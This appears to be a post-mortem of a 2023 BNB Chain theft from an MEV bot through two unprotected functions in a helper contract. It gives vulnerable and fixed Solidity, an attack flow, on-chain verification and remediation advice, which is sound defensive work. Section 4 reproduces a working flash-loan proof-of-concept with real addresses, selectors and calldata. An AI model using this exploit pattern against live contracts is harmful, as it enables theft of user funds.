# MEV Bot 0x8c2d4e — Full BUSDT Theft via Access Control Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2023-11-12 |
| **Protocol** | MEV Bot (0x8C2D4ed92Badb9b65f278EfB8b440F4BC995fFe7) |
| **Chain** | BSC (BNB Chain) |
| **Loss** | ~$365,000 (366,058.04 BUSDT fully drained) |
| **Attacker** | [0x69e0...ea0](https://bscscan.com/address/0x69e068eb917115ed103278b812ec7541f021cea0) |
| **Attack Contract** | [0x3918...108](https://bscscan.com/address/0x3918e0d26b41134c006e8d2d7e3206a53b006108) |
| **Attack Tx** | [0x3dcb...9b3](https://bscscan.com/tx/0x3dcb26a1f49eb4d02ca29960b4833bfb2e83d7b5d9591aed1204168944c8c9b3) |
| **Vulnerable Contract (MEV Bot)** | [0x8C2D...Fe7](https://bscscan.com/address/0x8C2D4ed92Badb9b65f278EfB8b440F4BC995fFe7) |
| **Intermediate Contract (Asset Harvester)** | [0x19a2...C9](https://bscscan.com/address/0x19a23DdAA47396335894229E0439D3D187D89eC9) |
| **Root Cause** | Missing access control on the AssetHarvestingContract's role designation function (`0xac3994ec`) and asset extraction function (`0x1270d364`) — anyone could transfer the entire balance of the victim MEV bot to an arbitrary address |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-11/MEV_0x8c2d_exp.sol) |
| **Reference Analysis** | [Phalcon Explorer](https://explorer.phalcon.xyz/tx/bsc/0x3dcb26a1f49eb4d02ca29960b4833bfb2e83d7b5d9591aed1204168944c8c9b3) |

---

## 1. Vulnerability Overview

This incident exploited an access control vulnerability between a MEV bot operating on BSC (0x8C2D4e...) and the **AssetHarvestingContract (0x19a23D...)** that managed its assets.

The core of the attack is that the two functions implemented in AssetHarvestingContract — **`designateRole()`(`0xac3994ec`)** and **`harvestAssets()`(`0x1270d364`)** — have **absolutely no caller authorization checks**. Both functions can be called by anyone externally, allowing the attacker to drain the MEV bot's entire BUSDT balance through the following steps:

1. Borrow an amount of BUSDT equal to the MEV bot's holdings (366,058 BUSDT) via a PancakeSwap V2 flash loan
2. Call `designateRole()` to grant the attack contract a "role" (no access control)
3. Call `harvestAssets()` to transfer the MEV bot's entire BUSDT balance to the attack contract (no access control)
4. Repay the flash loan and secure a net profit of **364,956.56 BUSDT (~$364,957)**

Since the flash loan is sized to match the MEV bot's asset balance, this is effectively a structure that **steals others' assets with zero personal capital**. The only real cost was the flash loan fee of 1,101.48 BUSDT.

---

## 2. Vulnerable Code Analysis

### 2.1 Role Designation Function — Missing Access Control (Core Vulnerability #1)

The `0xac3994ec` selector (`designateRole`) called in the PoC is the role configuration function of the AssetHarvestingContract. Reverse-engineering the internal structure of `designateRole()` from the PoC yields the following approximation:

```solidity
// ❌ Vulnerable code — designateRole (selector: 0xac3994ec)
// Anyone can call this function to grant asset extraction privileges to an arbitrary address
function designateRole(
    uint256 amount,        // BUSDT quantity
    uint8 flag0,           // 0 (reserved field)
    uint256 timeAndChain,  // (timestamp << 96) | (chainId << 64) — compound encoding
    uint8 flag1,           // 0 (reserved field)
    address token,         // target token address (BUSDT)
    uint8 flag2,           // 0
    uint8 flag3,           // 0
    address recipient      // address to receive the role (attacker sets to themselves)
) external {
    // ❌ No authorization check! Zero logic to verify msg.sender or owner
    // ❌ No modifier of any kind
    roles[recipient] = amount;  // sets extraction limit
    // Once this function executes, recipient is able to call harvestAssets()
}
```

```solidity
// ✅ Fixed code — only owner or admin can designate roles
modifier onlyOwner() {
    require(msg.sender == owner, "Access denied: only owner can call");
    _;
}

function designateRole(
    uint256 amount,
    uint8 flag0,
    uint256 timeAndChain,
    uint8 flag1,
    address token,
    uint8 flag2,
    uint8 flag3,
    address recipient
) external onlyOwner {  // ✅ onlyOwner modifier is mandatory
    require(recipient != address(0), "Invalid recipient address");
    require(amount > 0, "Amount must be greater than 0");
    roles[recipient] = amount;
    emit RoleDesignated(recipient, amount);  // ✅ Event logging for auditability
}
```

**Issue**: Despite being a core administrative function that grants privileges, `designateRole()` has no access control modifier whatsoever such as `onlyOwner`. The attacker was able to call this function to unauthorizedly grant themselves (the attack contract) execution rights for `harvestAssets()`.

---

### 2.2 Asset Extraction Function — Missing Access Control (Core Vulnerability #2)

The `0x1270d364` selector (`harvestAssets`) is the function that withdraws tokens from a designated contract:

```solidity
// ❌ Vulnerable code — harvestAssets (selector: 0x1270d364)
// Any address that has been granted a role can transfer assets from the victim contract to an arbitrary address
function harvestAssets(
    uint256 amount,        // quantity of tokens to drain
    uint8 flag0,           // 0
    uint256 timeAndChain,  // (timestamp << 96) | (chainId << 64)
    uint8 flag1,           // 0
    address token,         // token address to transfer (BUSDT)
    uint8 flag2,           // 0
    uint8 flag3,           // 0
    address source,        // contract address to drain assets from (victim MEV bot)
    address destination,   // address to send assets to (attack contract)
    uint8 flag4            // 0
) external {
    // ❌ Insufficient role check: even if roles[msg.sender] is checked, it's meaningless since designateRole is open
    // ❌ No source address validation: any arbitrary contract can be specified as source
    IERC20(token).transferFrom(source, destination, amount);
    // ↑ Either source (victim MEV bot) had already approved this contract,
    //   or the MEV bot had set unlimited allowance for AssetHarvestingContract
}
```

```solidity
// ✅ Fixed code — multiple validations applied
function harvestAssets(
    uint256 amount,
    uint8 flag0,
    uint256 timeAndChain,
    uint8 flag1,
    address token,
    uint8 flag2,
    uint8 flag3,
    address source,
    address destination,
    uint8 flag4
) external onlyOwner {  // ✅ onlyOwner is the minimum requirement
    require(allowedSources[source], "Source contract not whitelisted");  // ✅ source whitelist
    require(allowedTokens[token], "Token not whitelisted");              // ✅ token whitelist
    require(amount <= maxHarvestAmount, "Amount exceeds limit");         // ✅ amount cap
    IERC20(token).transferFrom(source, destination, amount);
    emit AssetsHarvested(source, destination, token, amount);
}
```

**Issue**: `harvestAssets()` transfers tokens from the `source` contract (victim MEV bot) to `destination`. Because the MEV bot had previously granted `approve` to the AssetHarvestingContract, simply calling this function without authorization was enough to drain the MEV bot's entire balance.

---

### 2.3 MEV Bot's Unlimited Approve — Vulnerability Amplifier

In the PoC's `pancakeCall` callback, the attack contract first calls `approve(max)` on BUSDT for the AssetHarvestingContract. This is the prerequisite that allows the AssetHarvestingContract to transfer BUSDT from the victim MEV bot when `harvestAssets()` is actually executed.

In other words, the victim MEV bot had **pre-set an unlimited or sufficiently large allowance** for the AssetHarvestingContract. This was an intentional design choice for normal operations, but because `harvestAssets()` itself lacked access control, this allowance was exploited for unauthorized theft.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attack contract (0x3918...) was deployed in advance
- Attacker EOA (0x69e0...) balance: 0 BUSDT (no capital required)
- Victim MEV bot (0x8C2D...) holdings: **366,058.04 BUSDT** (accumulated arbitrage profits)
- Victim MEV bot had pre-set approve for AssetHarvestingContract (0x19a2...)

### 3.2 Execution Phase

```
┌────────────────────────────────────────────────────────────────────────────┐
│  Attacker EOA (0x69e068...)                                                 │
│  Calls attack_contract.testExploit()                                        │
└───────────────────────────┬────────────────────────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────────────────────────┐
│  [Step 1] PancakeSwap V2 Flash Loan Request                                  │
│  WBNB_BUSDT_Pair.swap(amount=366,058 BUSDT, 0, attack_contract, data)      │
│  → PancakeSwap transfers 366,058.04 BUSDT to attack_contract               │
│  [Event 1] Transfer: WBNB_BUSDT_Pair → AttackContract : 366,058.04 BUSDT  │
└───────────────────────────┬────────────────────────────────────────────────┘
                            │ pancakeCall() callback entered
                            ▼
┌────────────────────────────────────────────────────────────────────────────┐
│  [Step 2] Set BUSDT approve                                                 │
│  BUSDT.approve(assetHarvestingContract, type(uint256).max)                 │
│  [Event 2] Approval: AttackContract → AssetHarvestingContract : MAX       │
└───────────────────────────┬────────────────────────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────────────────────────┐
│  [Step 3] Call designateRole() — ❌ No access control                       │
│  assetHarvestingContract.call(0xac3994ec,                                  │
│      amount=366,058 BUSDT,                                                 │
│      timeAndChain=(timestamp<<96)|(chainId<<64),                           │
│      token=BUSDT, recipient=AttackContract)                                │
│  → Grants AttackContract execution rights for harvestAssets                │
│  [Event 3] Transfer: AttackContract → AttackContract : 366,058.04 BUSDT   │
│             (internal accounting or role registration side effect)          │
└───────────────────────────┬────────────────────────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────────────────────────┐
│  [Step 4] Call harvestAssets() — ❌ No access control                       │
│  assetHarvestingContract.call(0x1270d364,                                  │
│      amount=366,058 BUSDT (entire victim bot balance),                     │
│      token=BUSDT,                                                          │
│      source=victimMevBot,   ← victim MEV bot address                       │
│      destination=AttackContract)  ← attack contract address                │
│  → BUSDT.transferFrom(victimMevBot, attackContract, 366,058 BUSDT)         │
│  [Event 5] Unknown(0x0ff585d6) @ AssetHarvestingContract  (internal event) │
│  [Event 6] Transfer: VictimMEVBot → AttackContract : 366,058.04 BUSDT     │
└───────────────────────────┬────────────────────────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────────────────────────┐
│  [Step 5] Revoke approve (minimize traces)                                  │
│  BUSDT.approve(assetHarvestingContract, 0)                                 │
│  [Event 7] Approval: AttackContract → AssetHarvestingContract : 0         │
└───────────────────────────┬────────────────────────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────────────────────────┐
│  [Step 6] Flash Loan Repayment                                              │
│  Repayment = 1 + (3 × 366,058) / 997 + 366,058 = 367,159.52 BUSDT        │
│  (including PancakeSwap 0.3% fee)                                           │
│  [Event 9] Transfer: AttackContract → WBNB_BUSDT_Pair : 367,159.52 BUSDT  │
│  [Event 10] Sync @ WBNB_BUSDT_Pair                                         │
│  [Event 11] Swap @ WBNB_BUSDT_Pair                                         │
└───────────────────────────┬────────────────────────────────────────────────┘
                            │
                            ▼
┌────────────────────────────────────────────────────────────────────────────┐
│  [Step 7] Profit Transfer                                                   │
│  Remaining BUSDT sent to attacker EOA                                       │
│  [Event 12] Transfer: AttackContract → Attacker_EOA : 364,956.56 BUSDT    │
└────────────────────────────────────────────────────────────────────────────┘
```

### 3.3 Outcome

| Item | Amount |
|------|------|
| BUSDT drained from victim MEV bot | 366,058.04 BUSDT |
| Flash loan fee | 1,101.48 BUSDT |
| **Attacker net profit** | **364,956.56 BUSDT (~$364,957)** |
| Attacker initial capital | 0 BUSDT |
| Gas consumed for attack | ~229,264 gas (approx. $0.21) |

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @KeyInfo - Total Lost : ~$365K
// Attacker : https://bscscan.com/address/0x69e068eb917115ed103278b812ec7541f021cea0
// Attack Contract : https://bscscan.com/address/0x3918e0d26b41134c006e8d2d7e3206a53b006108
// Victim Contract : https://bscscan.com/address/0x8c2d4ed92badb9b65f278efb8b440f4bc995ffe7
// Attack Tx : https://explorer.phalcon.xyz/tx/bsc/0x3dcb26a1f49eb4d02c...

contract ContractTest is Test {
    IERC20 private constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    Uni_Pair_V2 private constant WBNB_BUSDT =
        Uni_Pair_V2(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
    address private constant victimMevBot = 0x8C2D4ed92Badb9b65f278EfB8b440F4BC995fFe7;
    address private constant assetHarvestingContract = 0x19a23DdAA47396335894229E0439D3D187D89eC9;

    function setUp() public {
        // Fork at BSC block 33,435,892 (block immediately before attack)
        vm.createSelectFork("bsc", 33_435_892);
    }

    function testExploit() public {
        deal(address(BUSDT), address(this), 0);  // Initialize test environment

        // [Step 1] Set flash loan amount to the victim bot's entire BUSDT balance
        // PancakeSwap swap() call: non-empty data triggers pancakeCall() callback
        bytes memory data = abi.encode(assetHarvestingContract, victimMevBot);
        WBNB_BUSDT.swap(BUSDT.balanceOf(victimMevBot), 0, address(this), data);
    }

    function pancakeCall(
        address _sender,
        uint256 _amount0,   // borrowed BUSDT amount
        uint256 _amount1,
        bytes calldata _data
    ) external {
        // [Step 2] Set BUSDT approve for AssetHarvestingContract
        BUSDT.approve(assetHarvestingContract, type(uint256).max);

        // Compound encoding of time + chain ID (to satisfy internal validation logic in the function)
        uint256 currentTimePlusOne = block.timestamp + 1;
        uint256 chainId;
        assembly { chainId := chainid() }

        // [Step 3] Call designateRole() — grant role to attack contract
        // ❌ Core vulnerability: this function is callable by anyone (no onlyOwner)
        designateRole(currentTimePlusOne, chainId);

        // [Step 4] Call harvestAssets() — drain assets from victim bot
        // ❌ Core vulnerability: this function is also callable by anyone
        harvestAssets(currentTimePlusOne, chainId);

        // [Step 5] Revoke approve (remove residual permissions)
        BUSDT.approve(assetHarvestingContract, 0);

        // [Step 6] Repay flash loan (including PancakeSwap 0.3% fee)
        uint256 repayAmount = 1 + (3 * _amount0) / 997 + _amount0;
        BUSDT.transfer(address(WBNB_BUSDT), repayAmount);

        // Final profit check
        emit log_named_decimal_uint(
            "Attacker BUSDT balance (profit)",
            BUSDT.balanceOf(address(this)),
            BUSDT.decimals()
        );
    }

    function designateRole(uint256 time, uint256 chain) internal {
        // Selector 0xac3994ec = designateRole
        // timeAndChain = (timestamp << 96) | ((chainId << 64) & mask)
        (bool success,) = assetHarvestingContract.call(
            abi.encodeWithSelector(
                bytes4(0xac3994ec),
                BUSDT.balanceOf(address(this)),  // amount
                uint8(0),                         // flag0
                (time << 96) | ((chain << 64) & 0xffffffff0000000000000000),  // timeAndChain
                uint8(0),                         // flag1
                address(BUSDT),                   // token
                uint8(0),                         // flag2
                uint8(0),                         // flag3
                address(this)                     // recipient = attack contract itself
            )
        );
        require(success, "designateRole() call failed");
    }

    function harvestAssets(uint256 time, uint256 chain) internal {
        // Selector 0x1270d364 = harvestAssets
        (bool success,) = assetHarvestingContract.call(
            abi.encodeWithSelector(
                bytes4(0x1270d364),
                BUSDT.balanceOf(address(this)),  // amount = entire bot balance
                uint8(0),
                (time << 96) | ((chain << 64) & 0xffffffff0000000000000000),
                uint8(0),
                address(BUSDT),                  // token = BUSDT
                uint8(0),
                uint8(0),
                victimMevBot,                    // source = victim MEV bot address
                address(this),                   // destination = attack contract
                uint8(0)
            )
        );
        require(success, "harvestAssets() call failed");
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | Missing access control on `designateRole()` | CRITICAL | CWE-284 | `03_access_control.md` — Pattern 1 |
| V-02 | Missing access control on `harvestAssets()` | CRITICAL | CWE-284 | `03_access_control.md` — Pattern 1 |
| V-03 | Unlimited Approve + untrusted contract | HIGH | CWE-732 | `07_token_integration.md` |
| V-04 | Missing source address validation | HIGH | CWE-20 | `03_access_control.md` — Pattern 7 |

---

### V-01: Missing Access Control on `designateRole()`

- **Description**: The `designateRole()` function (selector `0xac3994ec`) in AssetHarvestingContract is an administrative function that grants asset extraction privileges to specific addresses, yet it has absolutely no access control modifier such as `onlyOwner` or equivalent. Any arbitrary external account can unauthorizedly grant permissions to itself or another address.
- **Impact**: The attacker could grant a role to their contract, satisfying the precondition for a subsequent `harvestAssets()` call, enabling full theft of the victim bot's assets.
- **Attack Conditions**: Knowledge of the AssetHarvestingContract address + correct ABI encoding (timestamp and chain ID combination).

### V-02: Missing Access Control on `harvestAssets()`

- **Description**: The `harvestAssets()` function (selector `0x1270d364`) withdraws tokens from a designated `source` contract. With no caller verification, any address that has been granted a role via `designateRole()` can transfer tokens from an arbitrary `source` to an arbitrary `destination`.
- **Impact**: The entire BUSDT balance approved by the MEV bot to the AssetHarvestingContract (366,058 BUSDT, ~$366K) was drained in a single transaction.
- **Attack Conditions**: Role granted by exploiting V-01 + existence of allowance from the victim contract.

### V-03: Combination of Unlimited Approve and Untrusted Contract

- **Description**: The victim MEV bot is believed to have set a large or unlimited BUSDT `approve` for the AssetHarvestingContract. This was a configuration for normal MEV bot operations, but the access control vulnerability in AssetHarvestingContract itself allowed this allowance to be exploited for unauthorized theft.
- **Impact**: Without the approve, the `transferFrom()` call would have failed, making the unlimited approve a necessary condition for the attack's success.
- **Attack Conditions**: Victim bot's pre-set approve (configured during normal operations).

### V-04: Missing Source Address Validation

- **Description**: `harvestAssets()` accepts an arbitrary contract address as the `source` parameter and drains tokens from it. With no whitelist validation on `source`, the attacker can designate any contract that has granted approve to the AssetHarvestingContract as the `source`.
- **Impact**: The current damage was limited to one MEV bot, but the structure allowed any other contracts that had granted approve to the AssetHarvestingContract to be equally victimized.
- **Attack Conditions**: Ability to specify an arbitrary source.

---

## 6. Remediation Recommendations

### Immediate Actions

#### Action 1: Add Access Control to All Administrative Functions

```solidity
// ✅ Recommended: use OpenZeppelin Ownable or AccessControl
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";

contract AssetHarvestingContract is Ownable {

    bytes32 public constant HARVESTER_ROLE = keccak256("HARVESTER_ROLE");

    // ✅ Fixed: apply onlyOwner modifier
    function designateRole(
        uint256 amount,
        uint8 flag0,
        uint256 timeAndChain,
        uint8 flag1,
        address token,
        uint8 flag2,
        uint8 flag3,
        address recipient
    ) external onlyOwner {
        require(recipient != address(0), "Invalid recipient");
        roles[recipient] = amount;
        emit RoleDesignated(recipient, token, amount);
    }

    // ✅ Fixed: onlyOwner + source whitelist
    function harvestAssets(
        uint256 amount,
        uint8 flag0,
        uint256 timeAndChain,
        uint8 flag1,
        address token,
        uint8 flag2,
        uint8 flag3,
        address source,
        address destination,
        uint8 flag4
    ) external onlyOwner {
        require(allowedSources[source], "Source address not whitelisted");
        require(allowedTokens[token], "Token not whitelisted");
        IERC20(token).transferFrom(source, destination, amount);
        emit AssetsHarvested(source, destination, token, amount);
    }
}
```

#### Action 2: Minimize MEV Bot's Approve

```solidity
// ❌ Vulnerable: unlimited approve (estimated current state)
IERC20(token).approve(assetHarvestingContract, type(uint256).max);

// ✅ Fixed: approve only as needed (set immediately before execution + revoke immediately after)
function executeWithApprove(address token, uint256 amount) external onlyOwner {
    IERC20(token).approve(assetHarvestingContract, amount);  // ✅ exact amount only
    // ... execution logic ...
    IERC20(token).approve(assetHarvestingContract, 0);       // ✅ revoke immediately after execution
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01 designateRole access control | Apply `onlyOwner` or `AccessControl` role-based access control |
| V-02 harvestAssets access control | Apply `onlyOwner` + add multisig or timelock |
| V-03 Unlimited Approve | Approve only the required amount, revoke immediately after use |
| V-04 Missing source validation | Validate source via `allowedSources` whitelist mapping |
| Overall design | Add event logging to sensitive functions for audit trail |
| Monitoring | Implement emergency pause functionality triggered by detection of abnormal large asset movements |

---

## 7. Lessons Learned

1. **Administrative functions must always have access control**: Every `external`/`public` function that modifies state — including role grants, asset transfers, and parameter changes — must have at minimum an `onlyOwner` modifier. Even if intended for "internal use only," a function deployed on-chain can be called by anyone.

2. **Do not rely on function selectors (bytecode) for security**: Even if a function name is complex or the selector is obscure, this provides no security on the blockchain. Even without verified on-chain source code, attackers can reverse-engineer selectors from transaction history.

3. **Approvals must be scoped to the minimum and revoked immediately**: Unlimited approvals (`type(uint256).max`) maximize damage when an approved contract is compromised. Use the pattern of approving only the required amount and resetting to 0 after use.

4. **Functions that accept untrusted addresses as parameters are especially dangerous**: Functions that accept arbitrary addresses such as `source` or `destination` and perform token transfers are fundamentally unsafe without whitelist validation. Even with caller verification, the scope of `source` must be explicitly restricted.

5. **When separating MEV bots from asset management contracts, privilege boundaries must be clearly defined**: This incident is a case where the privilege design of the AssetHarvestingContract was insufficient in an architecture where the MEV bot and the contract were separated. Trust relationships and privilege boundaries between contracts must be clearly documented and validated through audits.

6. **Flash loans are the tool of zero-capital attacks**: If an access control vulnerability exists, attackers can use flash loans to drain a victim contract's entire balance in an instant with no personal capital. The impact of a vulnerability must always be assessed against the worst-case scenario of "attacker leverages a flash loan."

---

## 8. On-Chain Verification

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | PoC Value | On-Chain Actual | Match |
|------|-----------|-------------|------|
| BUSDT drained from victim bot | ~$365,000 | 366,058.04 BUSDT | ✅ Match |
| Flash loan borrowed | `BUSDT.balanceOf(victimMevBot)` | 366,058.04 BUSDT | ✅ Match |
| Flash loan repayment | `1 + (3*amount)/997 + amount` | 367,159.52 BUSDT | ✅ Match |
| Attacker net profit | ~$365,000 | 364,956.56 BUSDT | ✅ Match |
| Flash loan fee | PancakeSwap 0.3% | 1,101.48 BUSDT | ✅ Match |

### 8.2 On-Chain Event Log Sequence

| # | Event | Contract | From | To | Amount |
|---|--------|---------|------|-----|------|
| 1 | Transfer | BUSDT | WBNB_BUSDT_Pair | AttackContract | 366,058.04 |
| 2 | Approval | BUSDT | AttackContract | AssetHarvestingContract | MAX |
| 3 | Transfer | BUSDT | AttackContract → AttackContract | (internal processing) | 366,058.04 |
| 4 | Approval | BUSDT | (internal) | — | — |
| 5 | 0x0ff585d6 | AssetHarvestingContract | (harvestAssets execution) | — | — |
| 6 | Transfer | BUSDT | VictimMEVBot | AttackContract | 366,058.04 |
| 7 | Approval | BUSDT | AttackContract | AssetHarvestingContract | 0 (revoked) |
| 8 | Approval | BUSDT | — | — | — |
| 9 | Transfer | BUSDT | AttackContract | WBNB_BUSDT_Pair | 367,159.52 |
| 10 | Sync | WBNB_BUSDT_Pair | — | — | — |
| 11 | Swap | WBNB_BUSDT_Pair | — | — | — |
| 12 | Transfer | BUSDT | AttackContract | Attacker_EOA | 364,956.56 |

### 8.3 Precondition Verification

| Item | Block 33,435,892 (immediately before attack) | Verification Result |
|------|---------------------------|---------|
| Victim bot BUSDT balance | 366,058.04 BUSDT (366,058,040,206,325,661,577,467 wei) | ✅ Confirmed |
| Attacker BUSDT balance | 0 BUSDT | ✅ Attack with zero capital |
| Attack block number | 33,435,893 (fork at 33,435,892) | ✅ Matches PoC |
| Chain ID | 56 (BSC) | ✅ Confirmed |
| Attack Tx sender | 0x69e068Eb917115ed103278B812Ec7541f021CEa0 | ✅ Matches PoC metadata |
| Attack contract | 0x3918e0D26B41134c006e8D2d7e3206a53B006108 | ✅ Matches PoC metadata |

---

## Similar Cases

| Case | Loss | Similarity |
|------|------|--------|
| [MEV Bot 0x05f016 (2023-11-07, ETH)](https://bscscan.com) | ~$2M | MEV bot access control vulnerability, same class of public swap function exploitation |
| Poly Network (2021) | $611M | Missing access control on cross-chain privilege functions |
| Maestro (2023-10) | ~$500K | Router contract arbitrary call vulnerability |

---

*Document generated: 2026-04-11 | Analysis based on: DeFiHackLabs PoC + BSC on-chain verification*